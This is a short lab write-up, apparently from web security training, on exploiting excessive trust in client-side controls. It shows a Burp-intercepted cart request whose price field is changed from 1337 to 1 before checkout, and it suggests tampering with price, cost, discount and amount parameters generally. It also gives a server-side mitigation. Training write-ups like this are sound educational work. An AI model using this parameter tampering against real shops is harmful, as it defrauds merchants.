# Lab01 - Excessive Trust In Client-Side Controls

## Objective

Purchase the "Lightweight l33t Leather Jacket" at a reduced price.

---

# Vulnerability Overview

The application stores the price inside a client-controlled request.

The server trusts this value.

---

# Analysis

## Step 1

Add product to cart.

---

## Step 2

Intercept request with Burp.

Observe:

```http
POST /cart

productId=1
price=1337
quantity=1
```

---

## Step 3

Modify:

```http
price=1
```

---

## Step 4

Forward request.

---

## Step 5

Checkout.

Lab solved.

---

# Full Payload Used

Original:

```http
price=1337
```

Modified:

```http
price=1
```

---

# Why It Works

```text
Client Controls Price
        ↓
Attacker Modifies Value
        ↓
Server Trusts Value
        ↓
Price Manipulation
```

---

# Personal Analysis & Testing Process

Whenever I see:

```text
price
cost
discount
amount
```

I try parameter tampering.

---

# Mitigation

Prices should always be determined server-side.

---

# Related Theory

05-excessive-trust-in-client-side-controls.md

---

# Key Learnings

Client-side controls are not security.